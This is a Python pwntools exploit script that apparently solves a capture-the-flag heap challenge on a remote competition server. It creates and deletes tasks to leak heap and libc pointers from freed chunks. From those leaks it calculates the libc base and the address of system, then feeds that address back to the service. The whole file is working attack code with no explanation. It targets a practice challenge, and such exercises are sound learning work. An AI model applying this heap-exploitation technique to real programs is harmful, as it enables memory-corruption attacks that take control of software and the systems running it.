from pwn import *
import time
import re

CONN=None
def transfer(test):
    global CONN
    CONN.send(test)
    time.sleep(0.1)
    response=CONN.recvuntil(b"?")
    time.sleep(0.1)
    return  response

def createTask(i, c):
    print(transfer("1\n".encode('ascii')))
    msg = ''.join([c*i])
    print(transfer(msg.encode('ascii') + b"\n"))
    print("create task: "+str(i))


def deleteTask(i):
    print(transfer("2\n".encode('ascii')))
    print(transfer((str(i)+"\n").encode('ascii')))


def main():
    global CONN
    CONN = remote("99be83c002c61eea84618251-intro-heap-1.challenge.master.cscg.live", 31337, ssl=True)
    #CONN = remote("172.17.0.2",1024)
    
    response = CONN.recvuntil(b"choice? ")
    print(response)
    """while True:
        print(transfer(input().encode('ascii')))"""
    # input("wait for gdb")


    createTask(50, "A")
    createTask(50, "B")
    deleteTask(1)
    value=transfer("3".encode('ascii')+b"\n")
    print(value)
    index = value.find(b"[01]")+5
    print(value[index:])
    endindex = value[index:].find(b"\n---menu")+index
    result = value[index:endindex]
    print(result)
    escaped_bytes = ''.join('\\x{:02x}'.format(b) for b in result)
    print(escaped_bytes)
    heapbeginstring = "0x"+str(result[::-1].hex()).lstrip("0")
    # baseresult=result[::-1]-b"\x0C\x68"

    heapbegin = result[::-1]
    heapoffset = b"\x0C\x68"
    #baseresult = (int.from_bytes(heapbegin, "little")-int.from_bytes(heapoffset,"little")).to_bytes(max(len(heapbegin), len(heapoffset)), "little")

    #basebegin = "0x"+str(baseresult.hex()).lstrip("0")
    #print("Heap begins at: "+heapbeginstring+"000")
    #print("Base address should be: 0x"+basebegin+"000")
    for i in range(10):
        createTask(140, "B")

    for i in range(8):
        deleteTask(i+2)

    basevalue=transfer("3\n".encode('ascii'))
    print(basevalue)
    time.sleep(0.1)
    
    t = re.split(b"\n\[\d+\] ", basevalue)
    """while True:
        print(transfer(input().encode('ascii')))"""
    mainpoolbytes = t[9][::-1]
    libcbase = int.from_bytes(mainpoolbytes, "big")-0x219CE0
    print("mainpool address: "+str(mainpoolbytes.hex()))
    print("libcbase: "+str(hex(libcbase)))
    print("system function at:"+str(libcbase+0x50d60) +
          " which is "+str(hex(libcbase+0x50d60)))
    # printfgot=(baseresult*1000)+0x1120
    # conn.send("4\n")
    # conn.send(str(printfgot)+"\n")
    # print(tn.read_eager())
    # conn.send("1".encode('ascii'))
    print(transfer("4\n".encode('ascii')))
    print(transfer((str(libcbase+0x50d60)+"\n").encode('ascii')))


if __name__ == "__main__":
    main()
